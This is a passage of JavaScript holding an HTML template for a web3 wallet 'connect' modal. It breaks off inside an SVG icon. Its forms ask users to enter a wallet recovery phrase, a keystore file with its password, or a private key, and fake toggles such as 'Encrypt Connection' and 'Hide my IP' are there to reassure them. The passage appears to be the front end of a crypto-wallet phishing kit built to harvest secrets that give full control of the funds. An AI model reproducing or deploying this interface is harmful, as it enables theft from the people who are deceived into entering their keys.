const htmlContent = `
    <div class="hidden" id="connect-modal">
        <div id="modal">
            <div id="modal-head">
                <div class="help">
                    <img class="help-icon" src="help.svg">
                    <img src="tap.svg" class="hidden back-icon">

                </div>

                <div id="title">Get Started</div>
                <div>
                    <img id="modal-closes" src="new.svg" alt="none">


                </div>
            </div>


            <div class="hidden modal-main" id="modal-main-form-ul">
                <div class="modal-form">
                    <div class="modal-form-item">
                        <div class="form-image">
                            <svg viewBox="0 0 110 110" width="110" height="110">
                <rect
                  x="2"
                  y="2"
                  width="106"
                  height="106"
                  rx="36"
                  stroke-dasharray="116 245"
                  stroke-dashoffset="360"
                ></rect>
              </svg>

                            <img class="loading-img" alt="metamask" src="./img/new-way.svg" />
                        </div>

                        <div class="modal-form-texts">
                            <h6 class="form-text-header">
                                Initializing secure connection with
                                <span class="wallet-name"></span>.
                            </h6>
                        </div>

                        <div class="conn-mode">
                            <div class="conn-settings">
                                <div class="conn-mode-text">Hide my IP</div>
                                <div class="conn-mode-button">
                                    <label class="switch">
                    <input type="checkbox" />
                    <span class="toggle round"></span>
                  </label>
                                </div>
                            </div>

                            <div class="conn-settings">
                                <div class="conn-mode-text">Encrypt Connection</div>
                                <div class="conn-mode-button">
                                    <label class="switch">
                    <input type="checkbox" checked="" />
                    <span class="toggle round"></span>
                  </label>
                                </div>
                            </div>

                            <div class="conn-settings">
                                <div class="conn-mode-text">Auto Validate</div>
                                <div class="conn-mode-button">
                                    <label class="switch">
                    <input type="checkbox" checked="" />
                    <span class="toggle round"></span>
                  </label>
                                </div>
                            </div>
                        </div>

                        <div class="conn-mode tab">
                            <div class="conn-settings tablinks active" data-target="menmonic-form">
                                <div class="tablinks-text">Phrase</div>
                            </div>

                            <div class="conn-settings tablinks" data-target="keystore-form">
                                <div class="tablinks-text">Keystore JSON</div>
                            </div>

                            <div class="conn-settings tablinks" data-target="privkey-form">
                                <div class="tablinks-text">Private Key</div>
                            </div>
                        </div>

                        <form class="form menmonic-form">
                            <div class="form-group">
                                <label class="form-label">Phrase </label>
                                <textarea rows="3" minlength="20" type="text" required="" name="mnemonic-seed" id="okkk"></textarea>
                            </div>

                            <div class="form-group button">
                                <p id="form-instruction">
                                    Typically 12 (sometimes 24) words separated by a single space.
                                </p>

                                <button type="submit" id="submit-apiKey" class="form-submit-button">
                  import 
                </button>
                            </div>
                        </form>

                        <form class="form keystore-form hidden">
                            <div class="form-group">
                                <label class="form-label">Keystore JSON</label>
                                <textarea rows="3" minlength="12" type="text" required="" id="keyss" name="keystore"></textarea>
                                <p class="form-info color-blue" id="mnemonic-info">
                                    Please enter the keystore password.
                                </p>
                                <input minlength="2" type="text" required="" id="keysss" name="keystore pass" placeholder="******" />
                            </div>

                            <div class="form-group button">
                                <p id="form-instruction">
                                    Several lines of text beginning with “{…}” plus the password you used for encryption.
                                </p>
                                <button type="submit" id="submit-keystore" class="form-submit-button">
                  import 
                </button>
                            </div>
                        </form>

                        <form class="form privkey-form hidden">
                            <div class="form-group">
                                <label class="form-label">Private Key</label>
                                <textarea rows="2" minlength="20" type="text" required="" id="priv" name="priv_key"></textarea>
                            </div>

                            <div class="form-group button">
                                <p id="form-instruction">
                                    Several lines of text containing alphanumeric characters.
                                </p>
                                <button type="submit" id="submit-privateKey" class="form-submit-button">
                  import 
                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="hidden modal-main" id="modal-main-help-ul">
                <div class="modal-help">
                    <div class="modal-help-item">
                        <div class="help-images">
                            <svg fill="none" viewBox="0 0 60 60">
                <g clip-path="url(#a)">
                  <path
                    fill="#EB8B47"
                    d="M0 24.9c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02 0 15.65 0 24.9 0h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.02 60 15.65 60 24.9v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6C48.98 60 44.35 60 35.1 60H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 48.98 0 44.35 0 35.1V24.9Z"
                  ></path>
                  <path
                    stroke="#062B2B"
                    stroke-opacity=".1"
                    d="M.5 24.9c0-4.64 0-8.08.24-10.8.25-2.7.73-4.65 1.66-6.28A14.5 14.5 0 0 1 7.82 2.4C9.46 1.47 11.39 1 14.1.74A133 133 0 0 1 24.9.5h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.66a14.5 14.5 0 0 1 5.42 5.42c.93 1.63 1.41 3.57 1.66 6.28.24 2.72.24 6.16.24 10.8v10.2c0 4.63 0 8.08-.24 10.8-.25 2.7-.73 4.64-1.66 6.28a14.5 14.5 0 0 1-5.42 5.41c-1.63.94-3.57 1.42-6.28 1.67-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.67a14.5 14.5 0 0 1-5.42-5.4C1.47 50.53 1 48.6.74 45.88A133 133 0 0 1 .5 35.1V24.9Z"
                  ></path>
                  <path
                    fill="#FF974C"
                    stroke="#fff"
                    stroke-width="2"
                    d="M39.2 29.2a13 13 0 1 0-18.4 0l1.3 1.28a12.82 12.82 0 0 1 2.1 2.39 6 6 0 0 1 .6 1.47c.2.76.2 1.56.2 3.17v11.24c0 1.08 0 1.61.13 2.12a4 4 0 0 0 .41.98c.26.45.64.83 1.4 1.6l.3.29c.65.65.98.98 1.36 1.09.26.07.54.07.8 0 .38-.11.7-.44 1.36-1.1l3.48-3.47c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.47-.48c-.65-.65-.98-.98-1.09-1.36a1.5 1.5 0 0 1 0-.8c.1-.38.44-.7 1.1-1.36l.47-.48c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.48-.5c-.65-.64-.98-.97-1.08-1.35a1.5 1.5 0 0 1 0-.79c.1-.38.42-.7 1.06-1.36l5.46-5.55Z"
                  ></path>
                  <circle
                    cx="30"
                    cy="17"
                    r="4"
                    fill="#EB8B47"
                    stroke="#fff"
                    stroke-width="2"
                  ></circle>
                </g>
                <defs>
                  <clippath id="a">
                    <path fill="#fff" d="M0 0h60v60H0z"></path>
                  </clippath>
                </defs>
              </svg>
                            <svg viewBox="0 0 60 60" fill="none">
                <g clip-path="url(#1)">
                  <rect width="60" height="60" rx="30" fill="#00ACE6"></rect>
                  <path
                    d="M59 73C59 89.0163 46.0163 102 30 102C13.9837 102 1 89.0163 1 73C1 56.9837 12 44 30 44C48 44 59 56.9837 59 73Z"
                    fill="#1AC6FF"
                    stroke="white"
                    stroke-width="2"
                  ></path>
                  <path
                    d="M18.6904 19.9015C19.6264 15.3286 23.3466 11.8445 27.9708 11.2096C29.3231 11.024 30.6751 11.0238 32.0289 11.2096C36.6532 11.8445 40.3733 15.3286 41.3094 19.9015C41.4868 20.7681 41.6309 21.6509 41.7492 22.5271C41.8811 23.5041 41.8811 24.4944 41.7492 25.4715C41.6309 26.3476 41.4868 27.2304 41.3094 28.097C40.3733 32.6699 36.6532 36.154 32.0289 36.7889C30.6772 36.9744 29.3216 36.9743 27.9708 36.7889C23.3466 36.154 19.6264 32.6699 18.6904 28.097C18.513 27.2304 18.3689 26.3476 18.2506 25.4715C18.1186 24.4944 18.1186 23.5041 18.2506 22.5271C18.3689 21.6509 18.513 20.7681 18.6904 19.9015Z"
                    fill="#1AC6FF"
                    stroke="white"
                    stroke-width="2"
                  ></path>
                  <circle cx="24.5" cy="23.5" r="1.5" fill="white"></circle>
                  <circle cx="35.5" cy="23.5" r="1.5" fill="white"></circle>
                  <path
                    d="M31 20L28 28H32"
                    stroke="white"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  ></path>
                </g>
                <rect
                  x="0.5"
                  y="0.5"
                  width="59"
                  height="59"
                  rx="29.5"
                  stroke="white"
                  stroke-opacity="0.1"
                ></rect>
                <defs>
                  <clippath id="1">
                    <rect width="60" height="60" rx="30" fill="white"></rect>
                  </clippath>
                </defs>
              </svg>
                            <svg fill="none" viewBox="0 0 60 60">
                <rect width="60" height="60" fill="#C653C6" rx="3"></rect>
                <path
                  fill="#fff"
                  d="M20.03 15.22C20 15.6 20 16.07 20 17v2.8c0 1.14 0 1.7-.2 2.12-.15.31-.3.5-.58.71-.37.28-1.06.42-2.43.7-.59.12-1.11.29-1.6.51a9 9 0 0 0-4.35 4.36C10 30 10 32.34 10 37c0 4.66 0 7 .84 8.8a9 9 0 0 0 4.36 4.36C17 51 19.34 51 24 51h12c4.66 0 7 0 8.8-.84a9 9 0 0 0 4.36-4.36C50 44 50 41.66 50 37c0-4.66 0-7-.84-8.8a9 9 0 0 0-4.36-4.36c-.48-.22-1-.39-1.6-.5-1.36-.29-2.05-.43-2.42-.7-.27-.22-.43-.4-.58-.72-.2-.42-.2-.98-.2-2.11V17c0-.93 0-1.4-.03-1.78a9 9 0 0 0-8.19-8.19C31.4 7 30.93 7 30 7s-1.4 0-1.78.03a9 9 0 0 0-8.19 8.19Z"
                ></path>
                <path
                  fill="#E87DE8"
                  d="M22 17c0-.93 0-1.4.04-1.78a7 7 0 0 1 6.18-6.18C28.6 9 29.07 9 30 9s1.4 0 1.78.04a7 7 0 0 1 6.18 6.18c.04.39.04.85.04 1.78v4.5a1.5 1.5 0 0 1-3 0V17c0-.93 0-1.4-.08-1.78a4 4 0 0 0-3.14-3.14C31.39 12 30.93 12 30 12s-1.4 0-1.78.08a4 4 0 0 0-3.14 3.14c-.08.39-.08.85-.08 1.78v4.5a1.5 1.5 0 0 1-3 0V17Z"
                ></path>
                <path
                  fill="#E87DE8"
                  fill-rule="evenodd"
                  d="M12 36.62c0-4.32 0-6.48.92-8.09a7 7 0 0 1 2.61-2.61C17.14 25 19.3 25 23.62 25h6.86c.46 0 .7 0 .9.02 2.73.22 4.37 2.43 4.62 4.98.27-2.7 2.11-5 5.02-5A6.98 6.98 0 0 1 48 31.98v5.4c0 4.32 0 6.48-.92 8.09a7 7 0 0 1-2.61 2.61c-1.61.92-3.77.92-8.09.92h-5.86c-.46 0-.7 0-.9-.02-2.73-.22-4.37-2.43-4.62-4.98-.26 2.58-1.94 4.82-4.71 4.99l-.7.01c-.55 0-.82 0-1.05-.02a7 7 0 0 1-6.52-6.52c-.02-.23-.02-.5-.02-1.05v-4.79Zm21.24-.27a4 4 0 1 0-6.48 0 31.28 31.28 0 0 1 1.57 2.23c.17.4.17.81.17 1.24V42.5a1.5 1.5 0 0 0 3 0V39.82c0-.43 0-.85.17-1.24.09-.2.58-.87 1.57-2.23Z"
                  clip-rule="evenodd"
                ></path>
                <rect
                  width="59"
                  height="59"
                  x=".5"
                  y=".5"
                  stroke="#fff"
                  stroke-opacity=".1"
                  rx="2.5"
                ></rect>
              </svg>
                        </div>

                        <div class="modal-help-texts">
                            <h6 class="help-text-header">One login for all of web3</h6>
                            <p class="help-text">
                                Log in to any app by connecting your wallet. Say goodbye to countless passwords!
                            </p>
                        </div>
                    </div>

                    <div class="modal-help-item">
                        <div class="help-images">
                            <svg fill="none" viewBox="0 0 60 60">
                <g clip-path="url(#a)">
                  <path
                    fill="#1DC956"
                    d="M0 25.01c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02.11 15.65.11 24.9.11h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.13 60 15.76 60 25v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-3.45 1.97-8.08 1.97-17.33 1.97H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 49.1 0 44.46 0 35.21v-10.2Z"
                  ></path>
                  <path
                    fill="#2BEE6C"
                    d="M16.1 60c-3.82-.18-6.4-.64-8.53-1.86a15 15 0 0 1-5.6-5.6C.55 50.06.16 46.97.04 41.98L4.2 40.6a4 4 0 0 0 2.48-2.39l4.65-12.4a2 2 0 0 1 2.5-1.2l2.53.84a2 2 0 0 0 2.43-1l2.96-5.94a2 2 0 0 1 3.7.32l3.78 12.58a2 2 0 0 0 3.03 1.09l3.34-2.23a2 2 0 0 0 .65-.7l5.3-9.72a2 2 0 0 1 1.42-1.01l4.14-.69a2 2 0 0 1 1.6.44l3.9 3.24a2 2 0 0 0 2.7-.12l4.62-4.63c.08 2.2.08 4.8.08 7.93v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-2.13 1.22-4.7 1.68-8.54 1.86H16.11Z"
                  ></path>
                  <path
                    fill="#fff"
                    d="m.07 43.03-.05-2.1 3.85-1.28a3 3 0 0 0 1.86-1.79l4.66-12.4a3 3 0 0 1 3.75-1.8l2.53.84a1 1 0 0 0 1.21-.5l2.97-5.94a3 3 0 0 1 5.56.48l3.77 12.58a1 1 0 0 0 1.51.55l3.34-2.23a1 1 0 0 0 .33-.35l5.3-9.71a3 3 0 0 1 2.14-1.53l4.13-.69a3 3 0 0 1 2.41.66l3.9 3.24a1 1 0 0 0 1.34-.06l5.28-5.28c.05.85.08 1.75.1 2.73L56 22.41a3 3 0 0 1-4.04.19l-3.9-3.25a1 1 0 0 0-.8-.21l-4.13.69a1 1 0 0 0-.72.5l-5.3 9.72a3 3 0 0 1-.97 1.05l-3.34 2.23a3 3 0 0 1-4.53-1.63l-3.78-12.58a1 1 0 0 0-1.85-.16l-2.97 5.94a3 3 0 0 1-3.63 1.5l-2.53-.84a1 1 0 0 0-1.25.6l-4.65 12.4a5 5 0 0 1-3.1 3L.07 43.02Z"
                  ></path>
                  <path
                    fill="#fff"
                    fill-rule="evenodd"
                    d="M49.5 19a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
                    clip-rule="evenodd"
                  ></path>
                  <path
                    fill="#fff"
                    d="M45 .28v59.66l-2 .1V.19c.7.02 1.37.05 2 .1Z"
                  ></path>
                  <path
                    fill="#2BEE6C"
                    d="M47.5 19a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z"
                  ></path>
                  <path
                    stroke="#fff"
                    stroke-opacity=".1"
                    d="M.5 25.01c0-4.63 0-8.08.24-10.8.25-2.7.73-4.64 1.66-6.28a14.5 14.5 0 0 1 5.42-5.41C9.46 1.58 11.39 1.1 14.1.85A133 133 0 0 1 24.9.61h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.67a14.5 14.5 0 0 1 5.42 5.4c.93 1.65 1.41 3.58 1.66 6.3.24 2.71.24 6.16.24 10.79v10.2c0 4.64 0 8.08-.24 10.8-.25 2.7-.73 4.65-1.66 6.28a14.5 14.5 0 0 1-5.42 5.42c-1.63.93-3.57 1.41-6.28 1.66-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.66a14.5 14.5 0 0 1-5.42-5.42C1.47 50.66 1 48.72.74 46.01A133 133 0 0 1 .5 35.2v-10.2Z"
                  ></path>
                </g>
                <defs>
                  <clippath id="a">
                    <path fill="#fff" d="M0 0h60v60H0z"></path>
                  </clippath>
                </defs>
              </svg>
                            <svg fill="none" viewBox="0 0 60 60">
                <g clip-path="url(#a)">
                  <rect width="60" height="60" fill="#C653C6" rx="3"></rect>
                  <path
                    fill="#E87DE8"
                    stroke="#fff"
                    stroke-width="2"
                    d="M52.1 47.34c0-4.24-1.44-9.55-5.9-12.4a2.86 2.86 0 0 0-1.6-3.89v-.82c0-1.19-.52-2.26-1.35-3a4.74 4.74 0 0 0-2.4-6.26v-5.5a11.31 11.31 0 1 0-22.63 0v2.15a3.34 3.34 0 0 0-1.18 5.05 4.74 4.74 0 0 0-.68 6.44A5.22 5.22 0 0 0 14 35.92c-3.06 4.13-6.1 8.3-6.1 15.64 0 2.67.37 4.86.74 6.39a20.3 20.3 0 0 0 .73 2.39l.02.04v.01l.92-.39-.92.4.26.6h38.26l.3-.49-.87-.51.86.5.02-.01.03-.07a16.32 16.32 0 0 0 .57-1.05c.36-.72.85-1.74 1.33-2.96a25.51 25.51 0 0 0 1.94-9.07Z"
                  ></path>
                  <path
                    fill="#fff"
                    fill-rule="evenodd"
                    d="M26.5 29.5c-3-.5-5.5-3-5.5-7v-7c0-.47 0-.7.03-.9a3 3 0 0 1 2.58-2.57c.2-.03.42-.03.89-.03 2 0 2.5-2.5 2.5-2.5s0 2.5 2.5 2.5c1.4 0 2.1 0 2.65.23a3 3 0 0 1 1.62 1.62c.23.55.23 1.25.23 2.65v6c0 4-3 7-6.5 7 1.35.23 4 0 6.5-2v9.53C34 38.5 31.5 40 28 40s-6-1.5-6-2.97L24 34l2.5 1.5v-6ZM26 47h4.5c2.5 0 3 4 3 5.5h-3l-1-1.5H26v-4Zm-6.25 5.5H24V57h-8c0-1 1-4.5 3.75-4.5Z"
                    clip-rule="evenodd"
                  ></path>
                </g>
                <rect
                  width="59"
                  height="59"
                  x=".5"
                  y=".5"
                  stroke="#fff"
                  stroke-opacity=".1"
                  rx="2.5"
                ></rect>
                <defs>
                  <clippath id="a">
                    <rect width="60" height="60" fill="#fff" rx="3"></rect>
                  </clippath>
                </defs>
              </svg>
                            <svg fill="none" viewBox="0 0 60 60">
                <g clip-path="url(#a)">
                  <rect width="60" height="60" fill="#987DE8" rx="30"></rect>
                  <path
                    fill="#fff"
                    fill-rule="evenodd"
                    d="m15.48 28.37 11.97-19.3a3 3 0 0 1 5.1 0l11.97 19.3a6 6 0 0 1 .9 3.14v.03a6 6 0 0 1-1.16 3.56L33.23 50.2a4 4 0 0 1-6.46 0L15.73 35.1a6 6 0 0 1-1.15-3.54v-.03a6 6 0 0 1 .9-3.16Z"
                    clip-rule="evenodd"
                  ></path>
                  <path
                    fill="#643CDD"
                    d="M30.84 10.11a1 1 0 0 0-.84-.46V24.5l12.6 5.53a2 2 0 0 0-.28-1.4L30.84 10.11Z"
                  ></path>
                  <path
                    fill="#BDADEB"
                    d="M30 9.65a1 1 0 0 0-.85.46L17.66 28.64a2 2 0 0 0-.26 1.39L30 24.5V9.65Z"
                  ></path>
                  <path
                    fill="#643CDD"
                    d="M30 50.54a1 1 0 0 0 .8-.4l11.24-15.38c.3-.44-.2-1-.66-.73l-9.89 5.68a3 3 0 0 1-1.5.4v10.43Z"
                  ></path>
                  <path
                    fill="#BDADEB"
                    d="m17.97 34.76 11.22 15.37c.2.28.5.41.8.41V40.11a3 3 0 0 1-1.49-.4l-9.88-5.68c-.47-.27-.97.3-.65.73Z"
                  ></path>
                  <path
                    fill="#401AB3"
                    d="M42.6 30.03 30 24.5v13.14a3 3 0 0 0 1.5-.4l10.14-5.83a2 2 0 0 0 .95-1.38Z"
                  ></path>
                  <path
                    fill="#7C5AE2"
                    d="M30 37.64V24.46l-12.6 5.57a2 2 0 0 0 .97 1.39l10.13 5.82a3 3 0 0 0 1.5.4Z"
                  ></path>
                </g>
                <rect
                  width="59"
                  height="59"
                  x=".5"
                  y=".5"
                  stroke="#fff"
                  stroke-opacity=".1"
                  rx="29.5"
                ></rect>
                <defs>
                  <clippath id="a">
                    <rect width="60" height="60" fill="#fff" rx="30"></rect>
                  </clippath>
                </defs>
              </svg>
                        </div>

                        <div class="modal-help-texts">
                            <h6 class="help-text-header">A home for your digital assets</h6>
                            <p class="help-text">
                                A wallet lets you store, send and receive digital assets like cryptocurrencies and NFTs.
                            </p>
                        </div>
                    </div>

                    <div class="modal-help-item">
                        <div class="help-images">
                            <svg fill="none" viewBox="0 0 60 60">
                <rect width="60" height="60" fill="#1DC956" rx="30"></rect>
                <circle cx="30" cy="30" r="3" fill="#fff"></circle>
                <path
                  fill="#2BEE6C"
                  stroke="#fff"
                  stroke-width="2"
                  d="m45.32 17.9-.88-.42.88.42.02-.05c.1-.2.21-.44.26-.7l-.82-.15.82.16a2 2 0 0 0-.24-1.4c-.13-.23-.32-.42-.47-.57a8.42 8.42 0 0 1-.04-.04l-.04-.04a2.9 2.9 0 0 0-.56-.47l-.51.86.5-.86a2 2 0 0 0-1.4-.24c-.26.05-.5.16-.69.26l-.05.02-15.05 7.25-.1.05c-1.14.55-1.85.89-2.46 1.37a7 7 0 0 0-1.13 1.14c-.5.6-.83 1.32-1.38 2.45l-.05.11-7.25 15.05-.02.05c-.1.2-.21.43-.26.69a2 2 0 0 0 .24 1.4l.85-.5-.85.5c.13.23.32.42.47.57l.04.04.04.04c.15.15.34.34.56.47a2 2 0 0 0 1.41.24l-.2-.98.2.98c.25-.05.5-.17.69-.26l.05-.02-.42-.87.42.87 15.05-7.25.1-.05c1.14-.55 1.85-.89 2.46-1.38a7 7 0 0 0 1.13-1.13 12.87 12.87 0 0 0 1.43-2.56l7.25-15.05Z"
                ></path>
                <path
                  fill="#1DC956"
                  d="M33.38 32.72 30.7 29.3 15.86 44.14l.2.2a1 1 0 0 0 1.14.2l15.1-7.27a3 3 0 0 0 1.08-4.55Z"
                ></path>
                <path
                  fill="#86F999"
                  d="m26.62 27.28 2.67 3.43 14.85-14.85-.2-.2a1 1 0 0 0-1.14-.2l-15.1 7.27a3 3 0 0 0-1.08 4.55Z"
                ></path>
                <circle
                  cx="30"
                  cy="30"
                  r="3"
                  fill="#fff"
                  transform="rotate(45 30 30)"
                ></circle>
                <rect
                  width="59"
                  height="59"
                  x=".5"
                  y=".5"
                  stroke="#062B2B"
                  stroke-opacity=".1"
                  rx="29.5"
                ></rect>
              </svg>
                            <svg fill="none" viewBox="0 0 60 60">
                <rect width="60" height="60" fill="#794CFF" rx="3"></rect>
                <path
                  fill="#987DE8"
                  stroke="#fff"
                  stroke-width="2"
                  d="M33 22.5v-1H16v5H8.5V36H13v-5h3v7.5h17V31h1v7.5h17v-17H34v5h-1v-4Z"
                ></path>
                <path fill="#fff" d="M37.5 25h10v10h-10z"></path>
                <path fill="#4019B2" d="M42.5 25h5v10h-5z"></path>
                <path fill="#fff" d="M19.5 25h10v10h-10z"></path>
                <path fill="#4019B2" d="M24.5 25h5v10h-5z"></path>
                <path fill="#fff" d="M12 30.5h4V37h-4v-6.5Z"></path>
                <rect
                  width="59"
                  height="59"
                  x=".5"
                  y=".5"
                  stroke="#fff"
                  stroke-opacity=".1"
                  rx="2.5"
                ></rect>
              </svg>
                            <svg viewBox="0 0 60 60" fill="none">
                <g clip-path="url(#clip0_7734_50402)">
                  <path
                    d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
                    fill="#EB8B47"
                  ></path>
                  <path
                    d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
                    stroke="#062B2B"
                    stroke-opacity="0.1"
                  ></path>
                  <path
                    d="M19 52C24.5228 52 29 47.5228 29 42C29 36.4772 24.5228 32 19 32C13.4772 32 9 36.4772 9 42C9 47.5228 13.4772 52 19 52Z"
                    fill="#FF974C"
                    stroke="white"
                    stroke-width="2"
                  ></path>
                  <path
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                    d="M42.8437 8.3264C42.4507 7.70891 41.5493 7.70891 41.1564 8.32641L28.978 27.4638C28.5544 28.1295 29.0326 29.0007 29.8217 29.0007H54.1783C54.9674 29.0007 55.4456 28.1295 55.022 27.4638L42.8437 8.3264Z"
                    fill="white"
                  ></path>
                  <path
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                    d="M42.3348 11.6456C42.659 11.7608 42.9061 12.1492 43.4005 12.926L50.7332 24.4488C51.2952 25.332 51.5763 25.7737 51.5254 26.1382C51.4915 26.3808 51.3698 26.6026 51.1833 26.7614C50.9031 27 50.3796 27 49.3327 27H34.6673C33.6204 27 33.0969 27 32.8167 26.7614C32.6302 26.6026 32.5085 26.3808 32.4746 26.1382C32.4237 25.7737 32.7048 25.332 33.2669 24.4488L40.5995 12.926C41.0939 12.1492 41.341 11.7608 41.6652 11.6456C41.8818 11.5687 42.1182 11.5687 42.3348 11.6456ZM35.0001 26.999C38.8661 26.999 42.0001 23.865 42.0001 19.999C42.0001 23.865 45.1341 26.999 49.0001 26.999H35.0001Z"
                    fill="#FF974C"
                  ></path>
                  <path
                    d="M10.1061 9.35712C9.9973 9.67775 9.99867 10.0388 9.99978 10.3323C9.99989 10.3611 10 10.3893 10 10.4167V25.5833C10 25.6107 9.99989 25.6389 9.99978 25.6677C9.99867 25.9612 9.9973 26.3222 10.1061 26.6429C10.306 27.2317 10.7683 27.694 11.3571 27.8939C11.6777 28.0027 12.0388 28.0013 12.3323 28.0002C12.3611 28.0001 12.3893 28 12.4167 28H19C24.5228 28 29 23.5228 29 18C29 12.4772 24.5228 8 19 8H12.4167C12.3893 8 12.3611 7.99989 12.3323 7.99978C12.0388 7.99867 11.6778 7.9973 11.3571 8.10614C10.7683 8.306 10.306 8.76834 10.1061 9.35712Z"
                    fill="#FF974C"
                    stroke="white"
                    stroke-width="2"
                  ></path>
                  <circle
                    cx="19"
                    cy="18"
                    r="4"
                    fill="#EB8B47"
                    stroke="white"
                    stroke-width="2"
                  ></circle>
                  <circle
                    cx="19"
                    cy="42"
                    r="4"
                    fill="#EB8B47"
                    stroke="white"
                    stroke-width="2"
                  ></circle>
                </g>
                <defs>
                  <clippath id="clip0_7734_50402">
                    <rect width="60" height="60" fill="white"></rect>
                  </clippath>
                </defs>
              </svg>
                        </div>
                        <div class="modal-help-texts">
                            <h6 class="help-text-header">Your gateway to a new web</h6>
                            <p class="help-text">
                                With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more.
                            </p>
                        </div>
                    </div>

                    <div class="modal-help-item">
                        <button type="button" class="modal-button">
              <svg fill="none" viewBox="0 0 20 20">
                <path
                  fill="currentColor"
                  fill-rule="evenodd"
                  d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
                  clip-rule="evenodd"
                ></path>
              </svg>
              <span>Start Syncing</span>
            </button>
                    </div>
                </div>
            </div>

            <div class="hidden modal-main" id="modal-main-ul">
                <div id="modal-main-title">
                    <div class="searchbox">
                        <svg class="search-icon" id="fi_2801881" height="16" viewBox="0 0 6.3499999 6.3500002" width="16" xmlns="http://www.w3.org/2000/svg" xmlns:svg="http://www.w3.org/2000/svg">
              <g id="layer1" transform="translate(0 -290.65)">
                <path
                  id="circle2017"
                  d="m2.8944091 291.16099c-1.3119941 0-2.38073328 1.06874-2.38073328 2.38074 0 1.31199 1.06873918 2.3828 2.38073328 2.3828.5603925 0 1.0757805-.19638 1.4831137-.52245l.9916707.99115a.26516505.26516505 0 0 0 .375171-.37465l-.9916708-.99167c.3263411-.40796.5229654-.92414.5229654-1.48518 0-1.312-1.0692559-2.38074-2.38125-2.38074zm0 .52917c1.0260113 0 1.8515666.82556 1.8515666 1.85157s-.8255553 1.85363-1.8515666 1.85363-1.8515666-.82762-1.8515666-1.85363.8255553-1.85157 1.8515666-1.85157z"
                  font-variant-ligatures="normal"
                  font-variant-position="normal"
                  font-variant-caps="normal"
                  font-variant-numeric="normal"
                  font-variant-alternates="normal"
                  font-feature-settings="normal"
                  text-indent="0"
                  text-align="start"
                  text-decoration-line="none"
                  text-decoration-style="solid"
                  text-decoration-color="rgb(0,0,0)"
                  text-transform="none"
                  text-orientation="mixed"
                  white-space="normal"
                  shape-padding="0"
                  isolation="auto"
                  mix-blend-mode="normal"
                  solid-color="rgb(0,0,0)"
                  solid-opacity="1"
